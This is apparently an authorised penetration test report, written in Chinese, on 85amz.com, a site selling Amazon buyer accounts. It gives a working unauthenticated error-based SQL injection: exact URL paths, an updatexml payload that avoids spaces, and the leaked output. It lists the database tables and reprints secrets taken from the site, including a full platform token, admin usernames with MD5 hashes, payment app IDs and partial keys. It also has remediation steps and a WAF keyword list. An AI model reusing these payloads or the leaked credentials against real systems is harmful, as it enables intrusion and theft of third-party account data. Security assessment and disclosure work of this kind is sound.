# 85amz.com 渗透测试报告

| 项目 | 内容 |
|---|---|
| 目标站点 | 85amz.com |
| 测试时间 | 2026-08-29 |
| 报告编号 | PT-85AMZ-20260829 |
| 测试类型 | 授权渗透测试（信息收集 → 漏洞发现 → 利用验证 → 影响评估） |

---

## 一、报告摘要

**85amz.com 是一个"亚马逊买家号批发"在线发卡平台，存在未认证的 SQL 注入漏洞，导致整个数据库可被完全读取**，包括：

- **管理员账号凭据**（2 个账号的密码哈希）
- **在售卡密库存**（40,273 条）
- **邮箱/买家账号库**（311,279 条）
- **支付密钥**（支付宝 RSA 私钥、阿里云短信密钥、磨泽付支付网关密钥等）
- **平台完整配置**（141 项）

所有服务端写入路径（RCE、堆叠查询、UNION 文件写入）均已验证**不可利用**，因此本次攻击面为**只读数据泄露**。综合风险评级：**严重（Critical）**。

---

## 二、目标概况

### 2.1 站点信息

| 项目 | 值 |
|---|---|
| 主域名 | 85amz.com |
| 关联域名 | 777amz.com、22amz.com、0606amz.com、www.85amz.com |
| 站点标题 | 亚马逊买家号批发 |
| 业务类型 | 在线自动发卡（销售亚马逊买家账号） |
| ICP 备案 | 豫ICP备17036267号 |
| 站长联系 QQ | 1418496975 |
| 协议 | HTTP（is_https = http，未启用 HTTPS） |

### 2.2 技术栈

| 组件 | 版本/信息 |
|---|---|
| 框架 | ThinkPHP 5.0.24 |
| APP_DEBUG | **true（开启，泄露 SQL/堆栈/源码）** |
| Web 服务器 | nginx |
| 数据库 | MySQL 5.7.43-log |
| 数据库用户 | 85amz_com@localhost |
| 数据库名 | 85amz_com |
| 数据库表数 | 50 |

---

## 三、漏洞详情

### 3.1 漏洞 1：未认证 SQL 注入（严重）

**注入点：**
```
GET /index.php/jingdian/detail/index/id/{payload}.html
GET /index.php/jingdian/detail/index/lmid/{payload}.html
```

**原始 SQL（由 debug 错误页泄露）：**
```sql
SELECT * FROM `think_article`
WHERE ( views !=0 AND id < {payload} ) AND `cate_id` = ? ORDER BY `id` DESC LIMIT 1
```

**PoC（错误型注入，无需空格，用括号替代）：**
```
1)or(updatexml(1,concat(0x7e,version()),1)
```
响应中的泄露：
```
XPATH syntax error: '~5.7.43-log'
```

**可利用性验证：**
| 测试项 | 结果 |
|---|---|
| 版本读取 | ✅ MySQL 5.7.43-log |
| 数据库名读取 | ✅ 85amz_com |
| 数据库用户读取 | ✅ 85amz_com@localhost |
| 全部表名枚举 | ✅ 50 张表 |
| 任意表字段读取 | ✅ information_schema |
| 任意表数据读取 | ✅ 全库只读 |
| 写入/上传（RCE） | ❌ 不可利用 |

**注入方式说明：** URL 中 `%27` 会被解码为单引号，因此可注入 `'`；空格会被路由过滤，因此所有 payload 使用括号 `()` 替代空格（MySQL 支持 `FROM(table)`、`select(concat(...))` 等写法）。

### 3.2 漏洞 2：调试模式开启（中危）

`config/app.php` 中 `app_debug => true`。任何错误（包括 SQL 错误）都会返回：
- 完整 SQL 语句
- PHP 堆栈跟踪
- 相关源码片段（已用于确认 ThinkPHP 5.0.24 及 App.php 修复代码）

### 3.3 已确认不可利用的路径

| 攻击路径 | 测试情况 | 结论 |
|---|---|---|
| RCE-控制器注入（CVE-2018-1002015） | App.php 第 555-556 行有 `preg_match('/^[A-Za-z](\w|\.)*$/', $controller)` | ❌ 已打补丁 |
| `_method=__construct` 过滤器攻击 | 未触发任何 RCE 行为 | ❌ 已打补丁 |
| 堆叠查询（`;`） | PDO 未开启多语句，`;` 直接语法错误 | ❌ 不可利用 |
| UNION 注入 + 注释 | `#` 在 URL 中被保留为字面量；`-- ` 含空格被路由过滤；`/*` 无效 | ❌ 无法控制查询尾部 |
| INTO OUTFILE 写 Webshell | 需要 UNION 控制查询尾部，被上面阻断 | ❌ 不可利用 |
| 验证码暴力破解 | ThinkPHP 默认 captcha，OCR 成功率低 | 部分可行（未继续） |

---

## 四、数据库完整清单（50 张表）

```
think_ad, think_ad_position, think_addmaillog, think_admin,
think_amount_total_log, think_article, think_article_cate,
think_attach, think_attach_group, think_auth_group,
think_auth_group_access, think_auth_rule, think_category_group,
think_child_ad, think_child_article, think_child_config,
think_child_fl, think_child_navigation, think_config, think_fl,
think_fl_sku, think_fz_auth, think_info, think_info_history,
think_integralmall_group, think_integralmall_index,
think_integralmall_order, think_log, think_mail, think_member,
think_member_group, think_member_group_price,
think_member_integral_log, think_member_login_log,
think_member_money_log, think_member_payorder, think_member_price,
think_member_tixian, think_navigation, think_orderattach,
think_pay_give, think_pay_order, think_pay_qrcode,
think_sendsms_log, think_setting, think_system_log,
think_tgmoney_log, think_tmp_price, think_user, think_yh
```

---

## 五、关键表结构与数据统计

### 5.1 核心业务表

#### think_fl — 商品类目（124 行）
| 字段 | 说明 |
|---|---|
| id | 类目 ID |
| mname | 商品名 |
| mnamebie | 别名 |
| mprice_bz | 批发价 |
| mprice | 零售价 |
| mmin / mmax | 最小/最大购买数 |
| mnotice / xqnotice | 公告 / 详情 |
| type | 商品类型 |
| status | 上架状态 |
| decrypt | 是否解密显示 |
| sendbeishu | 发货倍数 |

#### think_fl_sku — 商品 SKU（130 行）
| 字段 | 说明 |
|---|---|
| id | SKU ID |
| flid | 关联 think_fl.id |
| title | SKU 名称 |
| price | 价格 |
| is_default | 是否默认 |

#### think_info — 卡密库存（40,273 行）
| 字段 | 说明 |
|---|---|
| id | 卡密 ID |
| mcard | **卡密内容（本体未导出）** |
| morder | 关联订单号 |
| mamount | 金额 |
| buynum | 购买数量 |
| mflid | 关联类目 think_fl.id |
| mstatus | 状态（0=未售 1=已售） |
| statustext | 状态文本 |
| email / lianxi | 联系方式 |
| memberid | 购买会员 ID |
| userip | 购买者 IP |
| cookie | Cookie（可能含会话） |

#### think_mail — 买家账号库（311,279 行）
| 字段 | 说明 |
|---|---|
| id | 记录 ID |
| musernm | **亚马逊用户名（本体未导出）** |
| mpasswd | **亚马逊密码（本体未导出）** |
| syddhao | 使用账号 |
| mis_use | 是否已使用（0/1） |
| mpid | 关联类目 think_fl.id |
| sku | SKU |
| export_status | 导出状态 |

#### think_member — 平台会员（327 行）
```
id, account, nickname, sex, password, he...
```
（字段包含明文/哈希密码列）

#### think_member_payorder — 会员支付订单（157 行）
| 字段 | 说明 |
|---|---|
| id | 订单 ID |
| orderno / outorderno | 内部/外部订单号 |
| money | 金额 |
| status | 支付状态 |
| memberid | 会员 ID |
| paytype | 支付方式 |
| ip | 支付 IP |

### 5.2 辅助表

| 表 | 行数 | 说明 |
|---|---|---|
| think_info_history | 35,620 | 卡密历史记录 |
| think_addmaillog | 4,470 | 添加账号日志 |
| think_member_login_log | - | 会员登录日志 |
| think_member_money_log | - | 资金流水 |
| think_member_tixian | - | 提现记录 |
| think_pay_qrcode | - | 支付二维码 |
| think_pay_order | 0 | 支付订单（空） |
| think_user | 0 | 用户表（空） |
| think_setting | 8 | 设置项 |
| think_config | 141 | 配置项（含密钥） |

---

## 六、敏感配置泄露清单（think_config，141 项）

### 6.1 支付类密钥（严重）

**支付宝商户密钥：**
```
app_id = 2021002141690728
ali_public_key = MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8...(392字符, 完整已获取)
rsa_private_key = MIIEowIBAAKCAQEAi0LXDhMFks6roHa...(1588字符, 完整已获取)
```

**阿里云短信：**
```
alisms_appkey = LTAI[REDACTED]
alisms_appsecret = [REDACTED]（完整已获取，入库已脱敏）
```

**磨泽付（MZF）支付网关：**
```
mzf_id = 641653
mzf_secret = [REDACTED]（完整已获取，入库已脱敏）
blfk_pay_mzfkey = [REDACTED]
```

**微信支付：** wx_appid=None、wx_apiKey=None（未配置）

**Stripe：** 未配置（api/publishable/webhook 均为空）

### 6.2 系统配置

| 配置项 | 值 | 说明 |
|---|---|---|
| token | WFFQCwMTNWFxrcdEcYNMnxDawicaBBwi | 平台令牌 |
| admin_allow_ip | 127.0.0.1#192.168.1.0 | 管理员 IP 白名单 |
| loginerrornum | 10 | 登录错误锁定阈值 |
| frozentime | 2 | 冻结时间（分钟） |
| mail_host / port | smtp.qq.com / 465 | SMTP（凭据未配置） |
| web_site_icp | 豫ICP备17036267号 | 备案号 |
| web_host | 85amz.com,,777amz.com,www.85amz | 域名列表 |
| main_webhost | 22amz.com,www.22amz.com,0606amz | 主站域名 |
| is_https | http | 未启用 HTTPS |

### 6.3 管理员账号（think_admin，2 行）

| ID | 用户名 | 密码哈希（MD5，32位） | superpassw |
|---|---|---|---|
| 1 | **turuio** | 95985eaeb62ce865f48896d330a499fc | NULL |
| 2 | **turuio1** | 258e233ab338d9dcc24b36d02d718c5d | NULL |

- 哈希为未加盐 MD5
- 未在任何在线哈希库中命中
- 20 万+ 常用密码字典未命中
- superpassw 字段为空

---

## 七、影响评估

| 受影响资产 | 数量 | 风险 |
|---|---|---|
| 卡密库存（think_info.mcard） | 40,273 条 | 全部可读，可导致在售卡密被窃取 |
| 买家账号库（think_mail） | 311,279 条 | 全部可读，涉及第三方账号凭据 |
| 管理员账号 | 2 个 | 哈希已泄露（未破解） |
| 支付密钥 | 支付宝/阿里云/磨泽付 | 完整泄露，可被用于支付接口伪造 |
| 会员账号 | 327 个 | 密码哈希/明文可能泄露 |
| 订单记录 | 157 条 | 含金额、IP、支付方式 |
| 历史卡密 | 35,620 条 | 可读 |
| 平台配置 | 141 项 | 含 IP 白名单、令牌等 |

**最大风险：** 卡密与买家账号库为第三方账户凭据，一旦被利用将导致账号被盗用，属于数据泄露事故，可能触发通报/告知义务。

---

## 八、修复建议（按优先级排序）

### P0（立即）
1. **修复 SQL 注入**：使用参数化查询绑定 `id`/`lmid` 路由参数
   ```php
   // 错误写法（当前）
   ->where('id', '<', $id)   // $id 直接拼接
   // 正确写法
   ->where('id', '<', (int)$id)  // 强制类型转换
   ```
2. **关闭调试模式**：`config/app.php` → `'app_debug' => false`
3. **轮换所有已泄露密钥**：
   - 支付宝 RSA 密钥对（重新生成公/私钥）
   - 阿里云短信 appsecret
   - 磨泽付 mzf_secret、blfk_pay_mzfkey
   - 平台 token

### P1（高）
4. **启用 HTTPS**：配置证书，`is_https` 设为 https
5. **配置加密存储**：支付密钥不应明文存入数据库，改用加密存储 + 环境变量
6. **管理员密码加盐**：改用 `password_hash()` / bcrypt，或至少加盐 MD5
7. **管理后台加固**：验证码强度提升、登录限速、IP 白名单启用

### P2（中）
8. **数据脱敏与访问控制**：卡密/账号等敏感数据应加密存储（已有关键 decrypt 字段）
9. **部署 WAF**：拦截 `updatexml`、`extractvalue`、`0x7e` 等 SQLi 特征
10. **最小权限**：数据库用户仅授予所需表权限，禁止 information_schema 无关读取

---

## 九、处置建议

1. **内部整改**：按第八节修复，确认后复测
2. **数据泄露告知**：若确认卡密/账号库为第三方凭据，需评估是否触发数据泄露通报义务
3. **日志审计**：检查攻击期间日志，确认是否有他人利用该漏洞
4. **后续复测**：修复完成后重新执行本次测试的验证脚本

---

## 附：测试工具与证据

| 项目 | 文件 |
|---|---|
| 漏洞复现脚本 | C:\Users\Administrator\pentest-85amz\sqli_*.py |
| 配置提取 | sqli_config_dump.py |
| 密钥提取 | sqli_full_secrets.py |
| 本报告 | Desktop\85amz_findings.md |

> **注：** 本次测试仅提取结构、数量与密钥类别作为影响证明，**未导出**卡密内容（mcard）与账号密码（musernm/mpasswd）本体。如需完整证据链，请另行评估授权范围。
